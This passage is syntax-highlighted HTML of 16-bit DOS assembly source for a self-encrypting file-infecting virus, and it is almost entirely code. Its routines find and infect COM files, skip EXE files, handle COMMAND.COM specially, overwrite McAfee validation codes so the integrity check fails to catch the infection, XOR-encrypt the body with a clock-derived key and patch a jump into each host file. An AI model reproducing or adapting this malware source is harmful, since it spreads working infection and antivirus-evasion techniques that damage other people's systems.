            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">3d02h</span><span class="sc0">                        </span><span class="sc1">; open file with read/write</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">; access</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                        </span><span class="sc1">; save file date/time stamp</span><span class="sc0">
            </span><span class="sc6">Xchg</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Bx</span><span class="sc0">                          </span><span class="sc1">; on the stack</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                          </span><span class="sc1">; read the first 4 bytes of</span><span class="sc0">
            </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc5">OrgPrg</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; the program onto OrgPrg</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Cs</span><span class="sc4">:[</span><span class="sc5">OrgPrg</span><span class="sc4">][</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; Check if renamed exe-file</span><span class="sc0">
            </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc12">'ZM'</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Je</span><span class="sc0"> </span><span class="sc5">ExeFile</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc12">'MZ'</span><span class="sc0">                         </span><span class="sc1">; Check if renamed weird exe-</span><span class="sc0">
            </span><span class="sc6">Je</span><span class="sc0"> </span><span class="sc5">ExeFile</span><span class="sc0">                          </span><span class="sc1">; file</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc8">Cs</span><span class="sc4">:[</span><span class="sc5">OrgPrg</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">][</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Check if already infected</span><span class="sc0">
            </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc12">'*'</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Jne</span><span class="sc0"> </span><span class="sc5">Infect</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">ExeFile</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc0">                          </span><span class="sc1">; If one of the checks is yes,</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">                          </span><span class="sc1">; close file and search next</span><span class="sc0">
            </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">Search</span><span class="sc0">                          </span><span class="sc1">; file</span><span class="sc0">

</span><span class="sc5">FSeek</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">                           </span><span class="sc1">; subroutine to jump to end</span><span class="sc0">
            </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">                           </span><span class="sc1">; or begin of file</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Ret</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">0fd1e</span><span class="sc4">[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">; check if the file is</span><span class="sc0">
            </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc12">'OC'</span><span class="sc0">                         </span><span class="sc1">; COMMAN?.COM (usually result</span><span class="sc0">
            </span><span class="sc6">Jne</span><span class="sc0"> </span><span class="sc5">NoCommand</span><span class="sc0">                       </span><span class="sc1">; if COMMAND.COM)</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">0fd1e</span><span class="sc4">[</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc12">'MM'</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Jne</span><span class="sc0"> </span><span class="sc5">NoCommand</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">0fd1e</span><span class="sc4">[</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc12">'NA'</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Jne</span><span class="sc0"> </span><span class="sc5">NoCommand</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                        </span><span class="sc1">; Jump to EOF</span><span class="sc0">
            </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">Fseek</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">0f000h</span><span class="sc0">                       </span><span class="sc1">; Check if file too large</span><span class="sc0">
            </span><span class="sc6">Jae</span><span class="sc0"> </span><span class="sc5">ExeFile</span><span class="sc0">

            </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc5">VirS</span><span class="sc0">                         </span><span class="sc1">; Check if file to short</span><span class="sc0">
            </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">ExeFile</span><span class="sc0">
            
            </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc5">VirS</span><span class="sc0">  
            </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
            </span><span class="sc6">Xchg</span><span class="sc0">    </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc5">EOFminVir</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">],</span><span class="sc8">Dx</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">VirS</span><span class="sc0">  
            </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">Cld</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">VirLen</span><span class="sc0">
</span><span class="sc5">On5</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">Push</span><span class="sc0">    </span><span class="sc8">Cx</span><span class="sc0">
</span><span class="sc5">On6</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">Lodsb</span><span class="sc0">
            </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">Jne</span><span class="sc0">     </span><span class="sc5">On4</span><span class="sc0">
            </span><span class="sc6">Loop</span><span class="sc0">    </span><span class="sc5">On6</span><span class="sc0">
</span><span class="sc5">On4</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">Je</span><span class="sc0">      </span><span class="sc5">Found0</span><span class="sc0">

            </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc0">
            </span><span class="sc6">Cmp</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">SeekLen</span><span class="sc0">
            </span><span class="sc6">Jb</span><span class="sc0">      </span><span class="sc5">On5</span><span class="sc0">
            </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">NoCommand</span><span class="sc0">

</span><span class="sc5">Found0</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">Pop</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc0">
            </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc0">
            </span><span class="sc6">Sub</span><span class="sc0">     </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">
            </span><span class="sc6">Xor</span><span class="sc0">     </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc5">EOFminVir</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">Add</span><span class="sc0">     </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Si</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0">     </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">Jmp</span><span class="sc0">     </span><span class="sc5">CalcVirus</span><span class="sc0">

</span><span class="sc5">EOFminVir</span><span class="sc0">   </span><span class="sc9">Dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">NoCommand</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                        </span><span class="sc1">; jump to EOF</span><span class="sc0">
            </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">FSeek</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">0f000h</span><span class="sc0">                       </span><span class="sc1">; Check if file too large</span><span class="sc0">
            </span><span class="sc6">Jb</span><span class="sc0"> </span><span class="sc5">NoExe1</span><span class="sc0">                           </span><span class="sc1">; if yes, goto exefile</span><span class="sc0">
            </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">ExeFile</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">NoExe1</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">                           </span><span class="sc1">; Check if file too short</span><span class="sc0">
            </span><span class="sc6">Ja</span><span class="sc0"> </span><span class="sc5">NoExe2</span><span class="sc0">                           </span><span class="sc1">; if yes, goto exefile</span><span class="sc0">
            </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">ExeFile</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">


</span><span class="sc5">NoExe2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">                           </span><span class="sc1">; calculate pointer to offset</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">                           </span><span class="sc1">; EOF-52 (for McAfee validation</span><span class="sc0">
            </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">52</span><span class="sc0">                           </span><span class="sc1">; codes)</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc8">Cx</span><span class="sc0">                           </span><span class="sc1">; move file pointer to the</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc8">Dx</span><span class="sc0">                           </span><span class="sc1">; calculated address</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc0">                          </span><span class="sc1">; read the last 52 bytes</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">0fb00h</span><span class="sc0">                       </span><span class="sc1">; of the file</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">52</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc4">:</span><span class="sc2">0Fb00h</span><span class="sc4">,</span><span class="sc2">0fdf0h</span><span class="sc0">                </span><span class="sc1">; check if protected with the</span><span class="sc0">
            </span><span class="sc6">Jne</span><span class="sc0"> </span><span class="sc5">Check2</span><span class="sc0">                          </span><span class="sc1">; AG option</span><span class="sc0">
            </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc4">:</span><span class="sc2">0fb02h</span><span class="sc4">,</span><span class="sc2">0aac5h</span><span class="sc0">                </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Jne</span><span class="sc0"> </span><span class="sc5">Check2</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                        </span><span class="sc1">; yes - let virus overwrite</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Si</span><span class="sc0">                           </span><span class="sc1">; the code with itself, so</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">                           </span><span class="sc1">; the file has no validation</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">; code</span><span class="sc0">
            </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">CalcVirus</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Check2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc4">:</span><span class="sc2">0Fb00h</span><span class="sc4">+</span><span class="sc2">42</span><span class="sc4">,</span><span class="sc2">0fdf0h</span><span class="sc0">             </span><span class="sc1">; check if protected with the</span><span class="sc0">
            </span><span class="sc6">Jne</span><span class="sc0"> </span><span class="sc5">Eof</span><span class="sc0">                             </span><span class="sc1">; AV option</span><span class="sc0">
            </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc4">:</span><span class="sc2">0Fb02h</span><span class="sc4">+</span><span class="sc2">42</span><span class="sc4">,</span><span class="sc2">0aac5h</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Jne</span><span class="sc0"> </span><span class="sc5">Eof</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                        </span><span class="sc1">; yes - let virus overwrite</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc8">Si</span><span class="sc0">                           </span><span class="sc1">; the code with itself, so</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Di</span><span class="sc0">                           </span><span class="sc1">; the file has no validation</span><span class="sc0">
            </span><span class="sc6">Add</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">42</span><span class="sc0">                           </span><span class="sc1">; code</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">CalcVirus</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Eof</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4202h</span><span class="sc0">                        </span><span class="sc1">; not AG or AV - jump to</span><span class="sc0">
            </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">Fseek</span><span class="sc0">                          </span><span class="sc1">; EOF</span><span class="sc0">

</span><span class="sc5">CalcVirus</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">Sub</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                            </span><span class="sc1">; calculate the jump for the</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc4">:</span><span class="sc5">CallPtr</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]+</span><span class="sc2">1</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">             </span><span class="sc1">; virus start</span><span class="sc0">

</span><span class="sc5">GetCrypt</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">2ch</span><span class="sc0">                          </span><span class="sc1">; get 100s seconds for the</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">; encryption value.</span><span class="sc0">
            </span><span class="sc6">Cmp</span><span class="sc0"> </span><span class="sc8">Dl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                            </span><span class="sc1">; if not zero, goto NoZero</span><span class="sc0">
            </span><span class="sc6">Jne</span><span class="sc0"> </span><span class="sc5">NoZero</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                            </span><span class="sc1">; If zero, display copyright</span><span class="sc0">
            </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc5">Msg</span><span class="sc4">[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">                      </span><span class="sc1">; message and generate again</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">; a number</span><span class="sc0">
            </span><span class="sc6">Jmp</span><span class="sc0"> </span><span class="sc5">GetCrypt</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">NoZero</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc4">:</span><span class="sc5">Decrypt</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">],</span><span class="sc8">Dl</span><span class="sc0">             </span><span class="sc1">; Store key into decryptor</span><span class="sc0">

            </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">MainVir</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; Move changed decryptor to</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Di</span><span class="sc4">,</span><span class="sc2">0fb00h</span><span class="sc0">                       </span><span class="sc1">; a safe place in memory</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">DecrLen</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Rep</span><span class="sc0"> </span><span class="sc6">Movsb</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Si</span><span class="sc4">,</span><span class="sc5">Crypt</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">; Encrypt the virus and merge</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">CryptLen</span><span class="sc0">                     </span><span class="sc1">; it to the changed decryptor</span><span class="sc0">
</span><span class="sc5">Encrypt</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">Lodsb</span><span class="sc0">                               </span><span class="sc1">; code</span><span class="sc0">
            </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Al</span><span class="sc4">,</span><span class="sc8">Dl</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Stosb</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Loop</span><span class="sc0"> </span><span class="sc5">Encrypt</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                          </span><span class="sc1">; append virus at EOF or over</span><span class="sc0">
            </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">0fb00h</span><span class="sc0">                       </span><span class="sc1">; the validation code of</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc5">VirLen</span><span class="sc0">                       </span><span class="sc1">; McAfee</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                        </span><span class="sc1">; Jump to BOF</span><span class="sc0">
            </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">FSeek</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                          </span><span class="sc1">; Write Jump at BOF</span><span class="sc0">
            </span><span class="sc6">Lea</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc5">CallPtr</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">Close</span><span class="sc0">                          </span><span class="sc1">; Jump to Close routine</span><span class="sc0">

</span><span class="sc5">Ready</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ah</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc0">                          </span><span class="sc1">; Restore DTA to normal</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                          </span><span class="sc1">; offset</span><span class="sc0">
            </span><span class="sc6">Int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ax</span><span class="sc4">,</span><span class="sc8">Cs</span><span class="sc4">:</span><span class="sc5">OldInt24</span><span class="sc4">[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">; remove critical error</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Dx</span><span class="sc4">,</span><span class="sc8">Cs</span><span class="sc4">:</span><span class="sc5">OldInt24</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">[</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; handler and store the</span><span class="sc0">
            </span><span class="sc6">Xor</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc4">,</span><span class="sc8">Bx</span><span class="sc0">                           </span><span class="sc1">; original handler at the</span><span class="sc0">
            </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Bx</span><span class="sc0">                             </span><span class="sc1">; interrupt table</span><span class="sc0">
            </span><span class="sc6">Pop</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc8">Dx</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Mov</span><span class="sc0"> </span><span class="sc8">Ds</span><span class="sc4">:[</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">24h</span><span class="sc4">]+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc8">Ax</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">Push</span><span class="sc0"> </span><span class="sc8">Cs</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
